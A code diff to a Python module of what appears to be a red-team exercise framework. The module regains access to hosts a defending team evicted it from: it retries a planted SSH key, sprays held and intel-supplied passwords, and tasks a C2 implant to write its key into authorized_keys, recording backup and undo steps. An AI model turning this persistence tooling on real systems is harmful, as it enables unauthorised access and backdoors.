@@ -1,39 +1,4 @@
-"""reestablish — get back onto a box we lost, cheapest mechanism first.
-
-The eviction-recovery effect: the earlier agent's `foothold_ssh` plus the
-re-entry rungs its director walked after blue evicted us (held creds -> spray ->
-whatever channel still stands). Blue evicts by rotating a password, deleting a key, hardening
-sshd or dropping a firewall rule; each of those closes exactly one door, so the
-mechanisms are tried in ascending order of what they cost us and how loud they
-are:
-
-1. ``key``      — the private half of the key the persistence family planted
-                  (``ctx.ssh.reentry_key``) and any key credential world already
-                  holds for this box. Quiet, needs no password, and it survives
-                  the rotation that took the password path away — which is why
-                  it goes first (the earlier agent's transport carried the same key
-                  fallback).
-2. ``password`` — the credentials world already holds for this box, then intel's
-                  per-box ground truth and the generic pool. Bounded by
-                  `cred_spray_max` and by the gate's per-login retry counter.
-3. ``c2``       — last resort: with a LIVE channel, task the agent to put our
-                  public half back into the account's authorized_keys and then
-                  verify the foothold over SSH with the key. Blue who closes the
-                  login path but leaves the channel standing has closed one door
-                  and left another open.
-
-The C2 step is tasking, not planting: the payload/implant logic lives in `c2/`
-(`implant.py`, `effects/implant_channel.py`) and is not re-implemented here. With
-no live channel this effect says so and returns ``ok=False`` naming
-`implant_channel` — a channel that is not there is that effect's job.
-
-Nothing is claimed that was not verified on the wire: each mechanism ends with a
-real login (the earlier agent's `ssh_ok` alone reported access on boxes where it
-could not usefully work), and the key re-arm records its mutation with the
-artifact and the undo even when the verification that follows fails
-(``installed=True``) — a record gated on the verification disappears exactly when
-it is most needed.
-"""
+"""reestablish — get back onto a box we lost, cheapest mechanism first."""
 
 import shlex
 from pathlib import Path
@@ -43,11 +8,9 @@ from .base import Effect, Result, register
 from .spray_access import (candidate_pairs, is_windows_box, limits_of, probe_login,
                            sweep, sweep_summary)
 
-# The backup that makes the key re-arm undoable by COPY (takedown's CONF_SUFFIX
-# precedent: the original is always still on the box, nothing is edited in place).
+# The re-arm is undoable by COPY: the original file is always still on the box.
 KEY_BACKUP_SUFFIX = ".tlaloc-bak"
 
-# How many of intel's generic accounts to try a key for after the box's own.
 MAX_KEY_USERS = 5
 
 REARM_MARKER = "TLALOC_REARM"
@@ -55,20 +18,10 @@ REARM_MARKER = "TLALOC_REARM"
 # Windows admin logins read ONE key list, whoever the account is.
 WINDOWS_KEY_PATH = r"$env:ProgramData\ssh\administrators_authorized_keys"
 
-# Mechanisms in the order they are tried (the earlier agent's re-entry ladder, one
-# module).
 MECHANISMS = ("key", "password", "c2")
 
 
-# --- recovery material ---------------------------------------------------------
-
 def account_order(ctx, ip):
-    """Accounts to try a held key for, most likely first.
-
-    nakon's machine account (the account the box was built with), the box's own
-    primary account, root on Linux (the key family can land there), then intel's
-    candidate users — bounded, because every extra account is another probe.
-    """
     windows = is_windows_box(ctx, ip)
     hints = ctx.intel.hints_for(ip) or {}
     out = []
@@ -85,13 +38,11 @@ def account_order(ctx, ip):
 
 
 def reentry_key(ctx):
-    """The private half of the planted key, when red01 has it (persist sshkey)."""
     key = getattr(ctx.ssh, "reentry_key", None)
     return str(key) if key else None
 
 
 def key_candidates(ctx, ip):
-    """[(user, key_path)] — key credentials world holds, then the reentry key."""
     out = []
     for cred in ctx.world.valid_creds(ip):
         if cred.get("key_path"):
@@ -104,7 +55,6 @@ def key_candidates(ctx, ip):
 
 
 def password_candidates(ctx, ip):
-    """[(user, password)] — credentials we hold for this box, then intel's."""
     out = [(str(cred["user"]), str(cred["password"]))
            for cred in ctx.world.valid_creds(ip) if cred.get("password")]
     out.extend(candidate_pairs(ctx, ip))
@@ -112,19 +62,12 @@ def password_candidates(ctx, ip):
 
 
 def recovery_material(ctx, ip):
-    """True when ANY mechanism could plausibly work on this box."""
     return bool(ctx.world.valid_creds(ip) or reentry_key(ctx) or ctx.c2 is not None
                 or candidate_pairs(ctx, ip))
 
 
-# --- the live channel ----------------------------------------------------------
-
 def live_channel(ctx, ip, box_id=None):
-    """(box_id, callback record) for a channel inside the freshness window.
-
-    Same evidence rule as `task_channel`: a callback row with a fresh `seen_at`
-    is liveness; a row without one is not.
-    """
+    """Liveness = a callback row with a fresh `seen_at`; same evidence rule as task_channel."""
     if ctx.c2 is None:
         return None, None
     from .implant_channel import box_id_for
@@ -142,11 +85,7 @@ def live_channel(ctx, ip, box_id=None):
     return key, record
 
 
-# --- the key re-arm ------------------------------------------------------------
-
 def public_half(key_path):
-    """The public half of `key_path` (`<key>.pub`, or the file when it IS the
-    public key), one line, or None when red01 has no public half to plant."""
     if not key_path:
         return None
     for path in (Path(f"{key_path}.pub"), Path(str(key_path))):
@@ -165,14 +104,8 @@ def linux_key_path(user):
 
 
 def rearm_command(windows, user, pub):
-    """(command, key-file path) for putting our public half back.
-
-    Agent-native PowerShell/bash: a C2 task is executed by the agent itself, not
-    through cmd.exe, so there is no `winexec` wrap here (the wrap belongs to the
-    SSH-to-Windows path — see `exec/winexec.py`). The existing file is COPIED
-    before the append, which is what makes the undo a copy rather than a
-    hand-edited deletion.
-    """
+    """Runs in the agent, not via cmd.exe (no winexec wrap); COPIES the key file before
+    the append so the undo is a copy, not a hand-edited deletion."""
     if windows:
         path = WINDOWS_KEY_PATH
         cmd = (f'Copy-Item -Path "{path}" -Destination "{path}{KEY_BACKUP_SUFFIX}" '
@@ -193,7 +126,6 @@ def rearm_command(windows, user, pub):
 
 
 def rearm_restore(windows, path, pub):
-    """The undo: put the pre-rearm file back, then drop the copy."""
     if windows:
         return [f'Copy-Item -Path "{path}{KEY_BACKUP_SUFFIX}" -Destination "{path}" '
                 f'-Force',
@@ -245,14 +177,12 @@ class Reestablish(Effect):
 
         outcome = self._by_channel(ctx, ip, windows)
         if outcome.ok or outcome.installed:
-            # The box changed (key re-armed): that record must survive even when
-            # the foothold itself was not proven.
+            # The box changed (key re-armed): the record must survive even when the
+            # foothold itself was not proven.
             return outcome
         failures.append(f"c2: {outcome.detail}")
         return Result(False, f"{ip}: no path back onto the box — " + "; ".join(failures),
                       data={"mechanisms_tried": list(MECHANISMS)})
-
-    # -- mechanism 1: a held key -------------------------------------------------
 
     def _by_key(self, ctx, ip, windows):
         candidates = key_candidates(ctx, ip)
@@ -267,8 +197,6 @@ class Reestablish(Effect):
             return self._landed(ctx, ip, found, windows, "key")
         return Result(False, sweep_summary("no held key authenticates", ip, outcome),
                       data={"attempts": outcome["attempts"]})
-
-    # -- mechanism 2: a held (or intel-known) password ---------------------------
 
     def _by_password(self, ctx, ip, windows):
         candidates = password_candidates(ctx, ip)
@@ -285,8 +213,6 @@ class Reestablish(Effect):
         return Result(False, sweep_summary("no held or intel password authenticates",
                                            ip, outcome),
                       data={"attempts": outcome["attempts"]})
-
-    # -- mechanism 3: the live channel (last resort) -----------------------------
 
     def _by_channel(self, ctx, ip, windows):
         box_id, _record = live_channel(ctx, ip)
@@ -317,8 +243,7 @@ class Reestablish(Effect):
                                  f"channel ({box_id})"),
                       "check_cmd": None, "paths": [path]}]
         restore = {"recipe": rearm_restore(windows, path, pub), "secrets": None}
-        # Verify with the SAME probe the two earlier mechanisms used: the task
-        # being accepted says the agent ran it, not that we can log in.
+        # Accepted != logged in: verify with the same probe the other mechanisms used.
         status, who, why = probe_login(ctx, ip, user, "", windows, key_path=key,
                                        timeout=limits_of(ctx)[1])
         if status != "ok":
@@ -340,8 +265,6 @@ class Reestablish(Effect):
         result.artifacts = artifacts
         result.restore = restore
         return result
-
-    # -- the record ---------------------------------------------------------------
 
     def _landed(self, ctx, ip, found, windows, mechanism):
         user, password = found["user"], found.get("password") or ""
